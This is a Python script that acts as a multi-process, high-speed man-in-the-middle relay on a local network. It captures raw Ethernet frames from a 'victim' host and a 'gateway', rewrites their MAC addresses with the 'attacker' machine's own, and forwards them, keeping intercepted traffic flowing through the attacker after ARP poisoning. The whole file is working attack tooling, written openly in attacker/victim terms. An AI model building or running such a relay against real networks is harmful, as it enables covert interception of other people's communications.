#!/usr/bin/env python3
# fast_l2_redirect_workers.py
# Original main(IFACE, VICTIM, GATEWAY) preserved and extended to spawn parallel workers
# Uses PACKET_FANOUT + ctypes recvmmsg/sendmmsg + buffer reuse + integer MAC keys

import os
import sys
import socket
import struct
import argparse
import ctypes
import ctypes.util
import multiprocessing as mp
from fcntl import ioctl

# --- constants ---
ETH_P_ALL = 0x0003
SIOCGIFHWADDR = 0x8927
SIOCGIFINDEX  = 0x8933
SIOCGIFMTU    = 0x8921
MAX_FRAME = 65536
SOL_PACKET = 263
PACKET_FANOUT = 18
PACKET_FANOUT_HASH = 0  # hash fanout mode

# --- helper functions ---
def if_hwaddr(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        req = struct.pack('256s', ifname[:15].encode())
        info = ioctl(s.fileno(), SIOCGIFHWADDR, req)
        return info[18:24]
    finally:
        if ioctl_sock is None:
            s.close()

def if_index(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifreq = struct.pack('256s', ifname[:15].encode())
        res = ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
        return struct.unpack('i', res[16:20])[0]
    finally:
        if ioctl_sock is None:
            s.close()

def if_mtu(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifreq = struct.pack('256s', ifname[:15].encode())
        res = ioctl(s.fileno(), SIOCGIFMTU, ifreq)
        return struct.unpack('i', res[16:20])[0]
    except Exception:
        return None
    finally:
        if ioctl_sock is None:
            s.close()

def resolve_mac_ip(iface, ip):
    import subprocess
    try:
        out = subprocess.check_output(["ip", "neigh", "show", "to", ip], stderr=subprocess.DEVNULL)
        text = out.decode(errors="ignore")
    except Exception:
        return None
    for token in text.split():
        if token.count(':') == 5:
            try:
                return bytes(int(b, 16) for b in token.split(':'))
            except Exception:
                continue
    return None

def mac_to_int(b):
    return int.from_bytes(b, "big")

# --- ctypes setup for recvmmsg / sendmmsg ---
libc_path = ctypes.util.find_library("c")
if not libc_path:
    raise RuntimeError("libc not found")
libc = ctypes.CDLL(libc_path, use_errno=True)

class IOVec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p),
                ("iov_len", ctypes.c_size_t)]

class MsgHdr(ctypes.Structure):
    _fields_ = [
        ("msg_name", ctypes.c_void_p),
        ("msg_namelen", ctypes.c_uint32),
        ("msg_iov", ctypes.POINTER(IOVec)),
        ("msg_iovlen", ctypes.c_size_t),
        ("msg_control", ctypes.c_void_p),
        ("msg_controllen", ctypes.c_size_t),
        ("msg_flags", ctypes.c_int)
    ]

class MMsgHdr(ctypes.Structure):
    _fields_ = [
        ("msg_hdr", MsgHdr),
        ("msg_len", ctypes.c_uint32)
    ]

libc.recvmmsg.argtypes = [ctypes.c_int,
                          ctypes.POINTER(MMsgHdr),
                          ctypes.c_uint,
                          ctypes.c_int,
                          ctypes.c_void_p]
libc.recvmmsg.restype = ctypes.c_int

libc.sendmmsg.argtypes = [ctypes.c_int,
                          ctypes.POINTER(MMsgHdr),
                          ctypes.c_uint,
                          ctypes.c_int]
libc.sendmmsg.restype = ctypes.c_int

# --- worker function ---
def worker_main(iface, group_id, cpu_affinity, victim_mac, gateway_mac, attacker_mac, mtu, batch_size):
    recvmmsg = libc.recvmmsg
    sendmmsg = libc.sendmmsg

    try:
        if cpu_affinity is not None:
            os.sched_setaffinity(0, {cpu_affinity})
    except Exception:
        pass

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    fanout_val = (group_id << 16) | PACKET_FANOUT_HASH
    s.setsockopt(SOL_PACKET, PACKET_FANOUT, struct.pack("I", fanout_val))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4*1024*1024)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
    s.bind((iface, 0))
    fd = s.fileno()

    BUFS = [bytearray(MAX_FRAME) for _ in range(batch_size)]
    bufr_ptrs = []
    for b in BUFS:
        buf_ct = (ctypes.c_char * len(b)).from_buffer(b)
        bufr_ptrs.append(ctypes.cast(buf_ct, ctypes.c_void_p))

    IOVecs = (IOVec * batch_size)()
    MMsgs = (MMsgHdr * batch_size)()
    for i in range(batch_size):
        IOVecs[i].iov_base = bufr_ptrs[i]
        IOVecs[i].iov_len = ctypes.c_size_t(MAX_FRAME)
        MMsgs[i].msg_hdr.msg_name = None
        MMsgs[i].msg_hdr.msg_namelen = 0
        MMsgs[i].msg_hdr.msg_iov = ctypes.pointer(IOVecs[i])
        MMsgs[i].msg_hdr.msg_iovlen = 1
        MMsgs[i].msg_hdr.msg_control = None
        MMsgs[i].msg_hdr.msg_controllen = 0
        MMsgs[i].msg_hdr.msg_flags = 0
        MMsgs[i].msg_len = 0

    allowed_frame_max = (mtu + 14) if mtu else 1514
    a_int = mac_to_int(attacker_mac)
    v_int = mac_to_int(victim_mac)
    g_int = mac_to_int(gateway_mac)

    tmpl_to_gw = bytearray(MAX_FRAME)
    tmpl_to_vic = bytearray(MAX_FRAME)
    tmpl_to_gw[0:6] = gateway_mac
    tmpl_to_gw[6:12] = attacker_mac
    tmpl_to_vic[0:6] = victim_mac
    tmpl_to_vic[6:12] = attacker_mac

    oversized_logged = False
    batch_ptr = ctypes.cast(MMsgs, ctypes.POINTER(MMsgHdr))

    while True:
        n = recvmmsg(fd, batch_ptr, batch_size, 0, None)
        if n <= 0:
            continue
        out_count = 0
        for i in range(n):
            rlen = MMsgs[i].msg_len
            if rlen <= 14:
                continue
            buf = BUFS[i]
            src_int = int.from_bytes(buf[6:12], "big")
            if src_int == a_int:
                continue
            dst_template = None
            if src_int == v_int:
                dst_template = tmpl_to_gw
            elif src_int == g_int:
                dst_template = tmpl_to_vic
            else:
                continue

            send_len = min(rlen, allowed_frame_max)
            if send_len < rlen and not oversized_logged:
                oversized_logged = True
                sys.stderr.write(f"warning: frame {rlen} > allowed {allowed_frame_max}; truncating.\n")

            buf[0:12] = dst_template[0:12]
            mv = memoryview(buf)
            mv[12:send_len] = buf[12:send_len]
            IOVecs[i].iov_len = ctypes.c_size_t(send_len)
            MMsgs[i].msg_len = send_len
            out_count += 1

        if out_count == 0:
            for j in range(n):
                IOVecs[j].iov_len = ctypes.c_size_t(MAX_FRAME)
                MMsgs[j].msg_len = 0
            continue

        sent = sendmmsg(fd, batch_ptr, out_count, 0)
        if sent < 0:
            for j in range(out_count):
                try:
                    s.send(bytes(BUFS[j][:MMsgs[j].msg_len]))
                except Exception:
                    pass

        for j in range(out_count):
            IOVecs[j].iov_len = ctypes.c_size_t(MAX_FRAME)
            MMsgs[j].msg_len = 0

# --- modified main function ---
def main(IFACE, VICTIM, GATEWAY, workers, batched):
    if os.geteuid() != 0:
        print("run as root", file=sys.stderr)
        sys.exit(1)

    victim_mac = resolve_mac_ip(IFACE, VICTIM)
    gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
    if not victim_mac or not gateway_mac:
        print("couldn't resolve macs", file=sys.stderr)
        sys.exit(1)

    ioctl_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        attacker_mac = if_hwaddr(IFACE, ioctl_sock)
        mtu = if_mtu(IFACE, ioctl_sock)
    finally:
        ioctl_sock.close()

    allowed_frame_max = (mtu + 14) if mtu else 1514
    print("attacker mac:", ':'.join(f"{b:02x}" for b in attacker_mac))
    print("victim mac:", ':'.join(f"{b:02x}" for b in victim_mac))
    print("gateway mac:", ':'.join(f"{b:02x}" for b in gateway_mac))
    print("iface mtu:", mtu, "allowed_frame_max:", allowed_frame_max)
    print(f"spawning {workers} worker(s), batch_size={batched}")

    group_id = os.getpid() & 0xFFFF
    procs = []
    for i in range(workers):
        cpu = i if i < os.cpu_count() else None
        p = mp.Process(target=worker_main,
                       args=(IFACE, group_id, cpu, victim_mac, gateway_mac, attacker_mac, mtu, batched))
        p.daemon = True
        p.start()
        procs.append(p)
        print(f"started worker pid={p.pid} cpu={cpu}")

    try:
        for p in procs:
            p.join()
    except KeyboardInterrupt:
        print("stopping workers...")
    finally:
        for p in procs:
            try:
                p.terminate()
            except Exception:
                pass

